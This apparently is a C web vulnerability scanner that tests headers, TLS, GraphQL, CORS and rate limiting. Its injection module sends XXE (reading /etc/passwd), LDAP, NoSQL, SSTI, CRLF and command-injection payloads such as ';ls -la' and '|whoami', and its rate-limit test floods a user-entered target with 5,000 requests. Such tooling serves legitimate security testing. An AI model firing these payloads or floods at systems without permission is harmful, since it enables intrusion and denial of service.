/*
 * Advanced Web Security Testing Suite 2025
 * Support: HTTP/3, QUIC, GraphQL, WebSocket, API Security
 * Modern C with libcurl (HTTP/3), JSON-C, pthread
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include <pthread.h>
#include <time.h>
#include <sys/time.h>
#include <json-c/json.h>
#include <signal.h>

#define MAX_THREADS 2000
#define MAX_URL_LENGTH 4096
#define MAX_RESPONSE_SIZE 10*1024*1024
#define VERSION "2.0-2025"

// สถิติการทดสอบ
typedef struct {
    char url[MAX_URL_LENGTH];
    int total_requests;
    int success_count;
    int error_count;
    int http2_count;
    int http3_count;
    double total_time;
    double min_response;
    double max_response;
    double avg_response;
    long total_bytes;
    int ddos_detected;
    int waf_detected;
} stats_t;

// ข้อมูล thread
typedef struct {
    char url[MAX_URL_LENGTH];
    int thread_id;
    int requests;
    stats_t *stats;
    pthread_mutex_t *mutex;
    volatile int *stop_flag;
} thread_data_t;

// Response data
typedef struct {
    char *memory;
    size_t size;
    long http_code;
    char *http_version;
} response_t;

// สี terminal
#define COLOR_RED     "\033[1;31m"
#define COLOR_GREEN   "\033[1;32m"
#define COLOR_YELLOW  "\033[1;33m"
#define COLOR_BLUE    "\033[1;34m"
#define COLOR_MAGENTA "\033[1;35m"
#define COLOR_CYAN    "\033[1;36m"
#define COLOR_RESET   "\033[0m"

// Global stop flag
volatile sig_atomic_t global_stop = 0;

void signal_handler(int sig) {
    global_stop = 1;
    printf("\n%s[!] Stopping tests...%s\n", COLOR_YELLOW, COLOR_RESET);
}

// Callback สำหรับรับข้อมูล
static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    response_t *res = (response_t *)userp;
    
    char *ptr = realloc(res->memory, res->size + realsize + 1);
    if (!ptr) return 0;
    
    res->memory = ptr;
    memcpy(&(res->memory[res->size]), contents, realsize);
    res->size += realsize;
    res->memory[res->size] = 0;
    
    return realsize;
}

// ======== HTTP/3 และ Modern Protocol Testing ========
int test_http3_support(const char *url) {
    CURL *curl;
    CURLcode res;
    long http_version = 0;
    
    printf("\n%s=== HTTP/3 & QUIC Protocol Test ===%s\n", COLOR_CYAN, COLOR_RESET);
    
    curl = curl_easy_init();
    if (!curl) return 0;
    
    // Enable HTTP/3
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_3);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    
    res = curl_easy_perform(curl);
    
    if (res == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_HTTP_VERSION, &http_version);
        
        switch(http_version) {
            case CURL_HTTP_VERSION_3:
                printf("%s✓ HTTP/3 Supported (QUIC)%s\n", COLOR_GREEN, COLOR_RESET);
                break;
            case CURL_HTTP_VERSION_2:
                printf("%s✓ HTTP/2 Supported%s\n", COLOR_GREEN, COLOR_RESET);
                printf("%s⚠ HTTP/3 not available%s\n", COLOR_YELLOW, COLOR_RESET);
                break;
            case CURL_HTTP_VERSION_1_1:
                printf("%s⚠ Only HTTP/1.1 Supported%s\n", COLOR_YELLOW, COLOR_RESET);
                printf("%sRecommendation: Upgrade to HTTP/2 or HTTP/3%s\n", COLOR_CYAN, COLOR_RESET);
                break;
        }
    } else {
        printf("%s✗ Failed to test HTTP/3: %s%s\n", COLOR_RED, curl_easy_strerror(res), COLOR_RESET);
    }
    
    curl_easy_cleanup(curl);
    return (res == CURLE_OK);
}

// ======== GraphQL Security Testing ========
void test_graphql_vulnerabilities(const char *base_url) {
    printf("\n%s=== GraphQL Security Testing ===%s\n", COLOR_CYAN, COLOR_RESET);
    
    char graphql_paths[][64] = {
        "/graphql",
        "/api/graphql", 
        "/v1/graphql",
        "/graphql/v1",
        "/query"
    };
    
    // Test 1: Introspection Query (should be disabled in production)
    const char *introspection = "{\"query\":\"{__schema{types{name}}}\"}";
    
    // Test 2: Deep Nesting DoS
    const char *deep_query = "{\"query\":\"query{user{posts{comments{author{posts{comments{author{id}}}}}}}}}\"}";
    
    // Test 3: Batch Query Abuse
    const char *batch_attack = "[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]";
    
    // Test 4: Alias Overloading
    const char *alias_attack = "{\"query\":\"query{a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename}\"}";
    
    printf("Testing GraphQL endpoints...\n");
    
    for (int i = 0; i < sizeof(graphql_paths)/sizeof(graphql_paths[0]); i++) {
        char url[MAX_URL_LENGTH];
        snprintf(url, sizeof(url), "%s%s", base_url, graphql_paths[i]);
        
        CURL *curl = curl_easy_init();
        if (!curl) continue;
        
        response_t res = {0};
        res.memory = malloc(1);
        
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, introspection);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        
        CURLcode result = curl_easy_perform(curl);
        
        if (result == CURLE_OK) {
            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            
            if (http_code == 200 && res.size > 100) {
                printf("%s⚠ GraphQL endpoint found: %s%s\n", COLOR_YELLOW, graphql_paths[i], COLOR_RESET);
                
                // Check if introspection is enabled
                if (strstr(res.memory, "__schema") || strstr(res.memory, "types")) {
                    printf("%s✗ CRITICAL: Introspection enabled in production!%s\n", COLOR_RED, COLOR_RESET);
                    printf("   Fix: Disable introspection in production\n");
                }
                
                // Test for batching
                free(res.memory);
                res.memory = malloc(1);
                res.size = 0;
                
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, batch_attack);
                result = curl_easy_perform(curl);
                
                if (result == CURLE_OK && res.size > 50) {
                    printf("%s⚠ Batch queries allowed - DoS risk%s\n", COLOR_YELLOW, COLOR_RESET);
                    printf("   Fix: Implement batch query limits\n");
                }
            }
        }
        
        free(res.memory);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

// ======== API Security Headers Testing ========
void test_security_headers(const char *url) {
    printf("\n%s=== Security Headers Analysis ===%s\n", COLOR_CYAN, COLOR_RESET);
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    response_t res = {0};
    res.memory = malloc(1);
    
    // Get headers
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_HEADERDATA, &res);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    
    CURLcode result = curl_easy_perform(curl);
    
    if (result == CURLE_OK) {
        // Check critical headers
        const char *security_headers[] = {
            "Strict-Transport-Security",
            "Content-Security-Policy", 
            "X-Frame-Options",
            "X-Content-Type-Options",
            "Permissions-Policy",
            "Referrer-Policy"
        };
        
        int score = 0;
        int total = sizeof(security_headers) / sizeof(security_headers[0]);
        
        for (int i = 0; i < total; i++) {
            if (strcasestr(res.memory, security_headers[i])) {
                printf("%s✓ %s: Present%s\n", COLOR_GREEN, security_headers[i], COLOR_RESET);
                score++;
            } else {
                printf("%s✗ %s: Missing%s\n", COLOR_RED, security_headers[i], COLOR_RESET);
            }
        }
        
        printf("\nSecurity Score: %d/%d (%d%%)\n", score, total, (score * 100) / total);
        
        if (score < total / 2) {
            printf("%s⚠ WARNING: Poor security header configuration%s\n", COLOR_RED, COLOR_RESET);
        }
    }
    
    free(res.memory);
    curl_easy_cleanup(curl);
}

// ======== TLS/SSL Modern Testing ========
void test_tls_security(const char *url) {
    printf("\n%s=== TLS/SSL Security Test ===%s\n", COLOR_CYAN, COLOR_RESET);
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    // Test for weak ciphers
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_SSL_CIPHER_LIST, "DEFAULT:!DES:!3DES:!RC4");
    curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    
    CURLcode res = curl_easy_perform(curl);
    
    if (res == CURLE_OK) {
        printf("%s✓ TLS 1.2+ supported%s\n", COLOR_GREEN, COLOR_RESET);
        
        // Try to force TLS 1.3
        curl_easy_setopt(curl, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_3);
        res = curl_easy_perform(curl);
        
        if (res == CURLE_OK) {
            printf("%s✓ TLS 1.3 supported (Modern)%s\n", COLOR_GREEN, COLOR_RESET);
        } else {
            printf("%s⚠ TLS 1.3 not supported%s\n", COLOR_YELLOW, COLOR_RESET);
        }
    } else {
        printf("%s✗ TLS configuration issues%s\n", COLOR_RED, COLOR_RESET);
    }
    
    curl_easy_cleanup(curl);
}

// ======== Advanced Injection Testing ========
void test_advanced_injections(const char *base_url) {
    printf("\n%s=== Advanced Injection Testing ===%s\n", COLOR_CYAN, COLOR_RESET);
    
    // Modern injection payloads
    const char *payloads[][2] = {
        // NoSQL Injection
        {"nosql", "?user[$ne]=admin"},
        {"nosql", "?username[$regex]=.*"},
        
        // LDAP Injection
        {"ldap", "?name=*)(uid=*))(|(uid=*"},
        
        // XML Injection (XXE)
        {"xxe", "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"},
        
        // SSTI (Server-Side Template Injection)
        {"ssti", "?name={{7*7}}"},
        {"ssti", "?name=${7*7}"},
        
        // CRLF Injection
        {"crlf", "?redirect=/%0d%0aSet-Cookie:test=injected"},
        
        // Command Injection
        {"cmd", "?file=test.txt;ls -la"},
        {"cmd", "?ping=127.0.0.1|whoami"}
    };
    
    int num_tests = sizeof(payloads) / sizeof(payloads[0]);
    
    for (int i = 0; i < num_tests && !global_stop; i++) {
        char url[MAX_URL_LENGTH];
        
        if (strcmp(payloads[i][0], "xxe") == 0) {
            // POST request for XXE
            snprintf(url, sizeof(url), "%s/api/xml", base_url);
            
            CURL *curl = curl_easy_init();
            if (!curl) continue;
            
            response_t res = {0};
            res.memory = malloc(1);
            
            struct curl_slist *headers = NULL;
            headers = curl_slist_append(headers, "Content-Type: application/xml");
            
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payloads[i][1]);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
            
            CURLcode result = curl_easy_perform(curl);
            
            if (result == CURLE_OK && res.size > 0) {
                if (strstr(res.memory, "root:") || strstr(res.memory, "passwd")) {
                    printf("%s✗ CRITICAL: XXE vulnerability detected!%s\n", COLOR_RED, COLOR_RESET);
                }
            }
            
            free(res.memory);
            curl_slist_free_all(headers);
            curl_easy_cleanup(curl);
        } else {
            snprintf(url, sizeof(url), "%s%s", base_url, payloads[i][1]);
            
            CURL *curl = curl_easy_init();
            if (!curl) continue;
            
            response_t res = {0};
            res.memory = malloc(1);
            
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
            
            struct timeval start, end;
            gettimeofday(&start, NULL);
            CURLcode result = curl_easy_perform(curl);
            gettimeofday(&end, NULL);
            
            double elapsed = (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0;
            
            if (result == CURLE_OK) {
                // Check for SSTI
                if (strcmp(payloads[i][0], "ssti") == 0 && strstr(res.memory, "49")) {
                    printf("%s⚠ Possible SSTI vulnerability%s\n", COLOR_YELLOW, COLOR_RESET);
                }
                
                // Check for timing-based blind injection
                if (elapsed > 4.0) {
                    printf("%s⚠ Slow response detected (%s) - possible injection%s\n", 
                           COLOR_YELLOW, payloads[i][0], COLOR_RESET);
                }
            }
            
            free(res.memory);
            curl_easy_cleanup(curl);
        }
        
        usleep(100000); // 100ms delay
    }
}

// ======== CORS Misconfiguration Testing ========
void test_cors_security(const char *url) {
    printf("\n%s=== CORS Security Test ===%s\n", COLOR_CYAN, COLOR_RESET);
    
    const char *origins[] = {
        "https://evil.com",
        "null",
        "https://attacker.example.com"
    };
    
    for (int i = 0; i < sizeof(origins)/sizeof(origins[0]); i++) {
        CURL *curl = curl_easy_init();
        if (!curl) continue;
        
        response_t res = {0};
        res.memory = malloc(1);
        
        char origin_header[256];
        snprintf(origin_header, sizeof(origin_header), "Origin: %s", origins[i]);
        
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, origin_header);
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_HEADERDATA, &res);
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        
        CURLcode result = curl_easy_perform(curl);
        
        if (result == CURLE_OK) {
            if (strstr(res.memory, "Access-Control-Allow-Origin: *") ||
                strstr(res.memory, origins[i])) {
                printf("%s⚠ CORS misconfiguration: Accepts %s%s\n", 
                       COLOR_YELLOW, origins[i], COLOR_RESET);
            }
        }
        
        free(res.memory);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

// ======== Rate Limiting & DoS Protection Test ========
void* rate_limit_thread(void *arg) {
    thread_data_t *data = (thread_data_t*)arg;
    int blocked_count = 0;
    
    for (int i = 0; i < data->requests && !*data->stop_flag; i++) {
        CURL *curl = curl_easy_init();
        if (!curl) continue;
        
        response_t res = {0};
        res.memory = malloc(1);
        
        curl_easy_setopt(curl, CURLOPT_URL, data->url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        
        struct timeval start, end;
        gettimeofday(&start, NULL);
        CURLcode result = curl_easy_perform(curl);
        gettimeofday(&end, NULL);
        
        double elapsed = (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0;
        
        if (result == CURLE_OK) {
            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
            
            pthread_mutex_lock(data->mutex);
            
            if (http_code == 429 || http_code == 503) {
                data->stats->ddos_detected++;
                blocked_count++;
            } else if (http_code == 403 && res.size < 100) {
                data->stats->waf_detected++;
            } else if (http_code == 200) {
                data->stats->success_count++;
            } else {
                data->stats->error_count++;
            }
            
            data->stats->total_time += elapsed;
            data->stats->total_bytes += res.size;
            
            if (elapsed < data->stats->min_response || data->stats->min_response == 0) {
                data->stats->min_response = elapsed;
            }
            if (elapsed > data->stats->max_response) {
                data->stats->max_response = elapsed;
            }
            
            pthread_mutex_unlock(data->mutex);
        }
        
        free(res.memory);
        curl_easy_cleanup(curl);
        
        usleep(1000); // 1ms
    }
    
    if (blocked_count > data->requests / 2) {
        printf("%sThread %d: Rate limiting detected (%d blocked)%s\n", 
               COLOR_GREEN, data->thread_id, blocked_count, COLOR_RESET);
    }
    
    return NULL;
}

void test_rate_limiting(const char *url) {
    printf("\n%s=== Rate Limiting & DoS Protection Test ===%s\n", COLOR_CYAN, COLOR_RESET);
    printf("Sending burst traffic to test rate limits...\n");
    
    stats_t stats = {0};
    strcpy(stats.url, url);
    
    pthread_t threads[50];
    thread_data_t thread_data[50];
    pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
    volatile int stop_flag = 0;
    
    int num_threads = 50;
    int requests_per_thread = 100;
    
    struct timeval start, end;
    gettimeofday(&start, NULL);
    
    for (int i = 0; i < num_threads; i++) {
        strcpy(thread_data[i].url, url);
        thread_data[i].thread_id = i;
        thread_data[i].requests = requests_per_thread;
        thread_data[i].stats = &stats;
        thread_data[i].mutex = &mutex;
        thread_data[i].stop_flag = &stop_flag;
        
        pthread_create(&threads[i], NULL, rate_limit_thread, &thread_data[i]);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    gettimeofday(&end, NULL);
    double total_time = (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0;
    
    printf("\n%s=== Results ===%s\n", COLOR_CYAN, COLOR_RESET);
    printf("Total requests: %d\n", num_threads * requests_per_thread);
    printf("Successful: %d\n", stats.success_count);
    printf("Blocked (429/503): %d\n", stats.ddos_detected);
    printf("WAF blocks: %d\n", stats.waf_detected);
    printf("Errors: %d\n", stats.error_count);
    printf("Test duration: %.2f seconds\n", total_time);
    
    if (stats.ddos_detected > 0) {
        printf("%s✓ Rate limiting active%s\n", COLOR_GREEN, COLOR_RESET);
    } else if (stats.success_count > num_threads * requests_per_thread * 0.9) {
        printf("%s⚠ WARNING: No rate limiting detected!%s\n", COLOR_RED, COLOR_RESET);
        printf("   Recommendation: Implement rate limiting to prevent DoS\n");
    }
    
    if (stats.waf_detected > 0) {
        printf("%s✓ WAF detected%s\n", COLOR_GREEN, COLOR_RESET);
    }
    
    pthread_mutex_destroy(&mutex);
}

// ======== WebSocket Security Testing ========
void test_websocket_security(const char *base_url) {
    printf("\n%s=== WebSocket Security Test ===%s\n", COLOR_CYAN, COLOR_RESET);
    
    // Convert http to ws
    char ws_url[MAX_URL_LENGTH];
    if (strncmp(base_url, "https://", 8) == 0) {
        snprintf(ws_url, sizeof(ws_url), "wss://%s/ws", base_url + 8);
    } else if (strncmp(base_url, "http://", 7) == 0) {
        snprintf(ws_url, sizeof(ws_url), "ws://%s/ws", base_url + 7);
    } else {
        snprintf(ws_url, sizeof(ws_url), "ws://%s/ws", base_url);
    }
    
    printf("Testing WebSocket endpoint: %s\n", ws_url);
    printf("%s⚠ Note: Full WebSocket testing requires libwebsockets%s\n", 
           COLOR_YELLOW, COLOR_RESET);
    printf("   - Test for authentication\n");
    printf("   - Test for message validation\n");
    printf("   - Test for connection flooding\n");
}

// Main menu
int main() {
    char url[MAX_URL_LENGTH];
    int choice;
    
    // Setup signal handler
    signal(SIGINT, signal_handler);
    
    printf("\n");
    printf("%s╔══════════════════════════════════════════════════════╗%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s║   Advanced Web Security Testing Suite %s         ║%s\n", COLOR_CYAN, VERSION, COLOR_RESET);
    printf("%s║   Modern Vulnerability Scanner & Load Tester        ║%s\n", COLOR_CYAN, COLOR_RESET);
    printf("%s╚══════════════════════════════════════════════════════╝%s\n", COLOR_CYAN, COLOR_RESET);
    printf("\n");
    
    printf("Enter target URL (e.g., https://example.com): ");
    fgets(url, sizeof(url), stdin);
    url[strcspn(url, "\n")] = 0;
    
    if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
        printf("%sError: URL must start with http:// or https://%s\n", COLOR_RED, COLOR_RESET);
        return 1;
    }
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    while (!global_stop) {
        printf("\n%s╔═══ Test Menu ═══╗%s\n", COLOR_BLUE, COLOR_RESET);
        printf(" 1. HTTP/3 & QUIC Protocol Test\n");
        printf(" 2. Security Headers Analysis\n");
        printf(" 3. TLS/SSL Security Test\n");
        printf(" 4. GraphQL Vulnerability Scan\n");
        printf(" 5. Advanced Injection Testing\n");
        printf(" 6. CORS Security Test\n");
        printf(" 7. Rate Limiting & DoS Test\n");
        printf(" 8. WebSocket Security Test\n");
        printf(" 9. Full Security Audit (All Tests)\n");
        printf("%s10. Exit%s\n", COLOR_RED, COLOR_RESET);
        printf("\n%sChoice: %s", COLOR_GREEN, COLOR_RESET);
        
        if (scanf("%d", &choice) != 1) {
            while(getchar() != '\n');
            continue;
        }
        while(getchar() != '\n');
        
        switch (choice) {
            case 1:
                test_http3_support(url);
                break;
            case 2:
                test_security_headers(url);
                break;
            case 3:
                test_tls_security(url);
                break;
            case 4:
                test_graphql_vulnerabilities(url);
                break;
            case 5:
                test_advanced_injections(url);
                break;
            case 6:
                test_cors_security(url);
                break;
            case 7:
                test_rate_limiting(url);
                break;
            case 8:
                test_websocket_security(url);
                break;
            case 9:
                printf("\n%s=== Running Full Security Audit ===%s\n", COLOR_MAGENTA, COLOR_RESET);
                test_http3_support(url);
                test_security_headers(url);
                test_tls_security(url);
                test_graphql_vulnerabilities(url);
                test_advanced_injections(url);
                test_cors_security(url);
                test_rate_limiting(url);
                test_websocket_security(url);
                
                printf("\n%s╔═══════════════════════════════════════╗%s\n", COLOR_MAGENTA, COLOR_RESET);
                printf("%s║   Full Audit Complete                ║%s\n", COLOR_MAGENTA, COLOR_RESET);
                printf("%s╚═══════════════════════════════════════╝%s\n", COLOR_MAGENTA, COLOR_RESET);
                break;
            case 10:
                printf("\n%sExiting... Stay secure! 🔒%s\n", COLOR_CYAN, COLOR_RESET);
                goto cleanup;
            default:
                printf("%sInvalid choice!%s\n", COLOR_RED, COLOR_RESET);
        }
    }
    
cleanup:
    curl_global_cleanup();
    return 0;
}
